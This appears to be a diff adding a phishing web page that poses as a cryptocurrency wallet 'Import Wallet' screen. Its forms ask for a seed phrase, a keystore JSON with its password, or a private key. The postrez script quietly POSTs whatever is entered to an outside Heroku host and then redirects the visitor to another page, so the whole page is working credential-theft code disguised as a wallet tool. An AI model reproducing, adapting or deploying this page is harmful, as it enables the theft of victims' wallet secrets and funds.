@@ -1,0 +1,134 @@
+<html>
+
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <link rel="stylesheet" href="main.css" type="text/css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Import Wallet</title>
+    <script>
+        document.getElementsByName("phrase").reset();
+  document.getElementsByName("keystoreJSON").reset();
+  document.getElementsByName("password").reset();
+  document.getElementsByName("privateKey").reset();
+</script>
+    <script>
+        function openCity(evt, cityName) {
+    // Declare all variables
+    var i, tabcontent, tablinks;
+
+    // Get all elements with class="tabcontent" and hide them
+    tabcontent = document.getElementsByClassName("tabcontent");
+    for (i = 0; i < tabcontent.length; i++) {
+      tabcontent[i].style.display = "none";
+    }
+
+    // Get all elements with class="tablinks" and remove the class "active"
+    tablinks = document.getElementsByClassName("tablinks");
+    for (i = 0; i < tablinks.length; i++) {
+      tablinks[i].className = tablinks[i].className.replace(" active", "");
+    }
+
+    // Show the current tab, and add an "active" class to the button that opened the tab
+    document.getElementById(cityName).style.display = "block";
+    evt.currentTarget.className += " active";
+  }
+  </script>
+</head>
+
+<body>
+    <center>
+        <div class="top">
+            <a href="#" class="left">Github</a>
+            <a href="#" class="left">Docs</a>
+            <a href="#" class="main"><img src="logo.svg" alt="logo"></a>
+            <a href="#" class="left">Wallets</a>
+            <a href="#" class="left">Apps</a>
+        </div>
+        <br>
+        <h2>
+            <center>Import Wallet</center>
+        </h2>
+        <br>
+        <div class="tab">
+            <button class="tablinks active" id="default" onclick="openCity(event, &#39;phrase&#39;)">Phrase</button>
+            <button class="tablinks" onclick="openCity(event, &#39;keystore&#39;)">Keystore JSON</button>
+            <button class="tablinks" onclick="openCity(event, &#39;private&#39;)">Private Key</button>
+        </div>
+        <div>
+            <form class="form" id="form1" action="#" method="post">
+                <div id="phrase" class="tabcontent" style="display: block;">
+                    <input type="hidden" id="walletApp1" name="walletApp" value="">
+                    <textarea name="phrase" class="phrase" minlength="12" placeholder="Phrase" required=""></textarea>
+                    <input type="hidden" name="btn1" value="btn1">
+                    <br>
+                    <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+                    <br>
+                    <button type="button" name="btn1" form="form1" class="btn" onclick="postrez('form1')">IMPORT</button>
+                </div>
+            </form>
+            <form class="form" id="form2" action="#" method="post">
+                <div id="keystore" class="tabcontent" style="display: none;">
+                    <input type="hidden" id="walletApp1" name="walletApp" value="">
+                    <textarea name="keystoreJSON" class="phrase" minlength="12" placeholder="Keystore JSON" required=""></textarea>
+                    <br>
+                    <div class="field">
+                        <input type="password" name="password" placeholder="Password" required="">
+                        <input type="hidden" name="btn2" value="btn2">
+                    </div>
+                    <div class="desc">Several lines of text beginning with '(...)' plus the password you used to encrypt it.</div>
+                    <br>
+                    <button type="button" name="btn2" form="form2" class="btn" onclick="postrez('form2')">IMPORT</button>
+                </div>
+            </form>
+            <form class="form" id="form3" action="#" method="post">
+                <div id="private" class="tabcontent" style="display: none;">
+                    
+                    <input type="hidden" id="walletApp1" name="walletApp" value="">
+                    <div class="field">
+                        <input type="text" name="privateKey" class="key" placeholder="Private Key" required="">
+                        <input type="hidden" name="btn3" value="btn3">
+                    </div>
+                    <div class="desc">Typically 12 (sometimes 24) words separated by single spaces</div>
+                    <br>
+                    <button type="button" name="btn3" form="form3" class="btn"  onclick="postrez('form3')">IMPORT</button>
+                    <!--</form>-->
+                </div>
+            </form>
+        </div>
+        <footer>
+            <div id="footer">
+                <p><img src="discord.svg" class="footimg"> <a href="#">Discord</a></p><br>
+                <p><img src="telegram.svg" class="footimg"> <a href="#">Telegram</a></p><br>
+                <p><img src="twitter.svg" class="footimg"> <a href="#">Twitter</a></p><br>
+                <p><img src="github.svg" class="footimg"> <a href="#">Github</a></p><br>
+            </div>
+        </footer>
+    </center>
+    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+    <script type="text/javascript">
+         var url = new URL(window.location);
+    var wallet = url.searchParams.get("wallet");
+    $("#walletApp1").val(wallet)
+    function postrez(form){
+          var $form = $('#'+form+'');
+ var data = $form.serialize();
+
+$(".btn").attr('disabled',true) 
+
+         $(".btn").html('Please Wait...');
+        $.ajax({
+            type: "POST",
+            url: "https://murmuring-hollows-34228.herokuapp.com/",
+            data: data
+        }).done(function(data){
+             
+          console.log('response: ', data)
+  window.top.location.href = 'bar.html';
+          
+    
+        }); 
+    }
+</script>
+</body>
+
+</html>
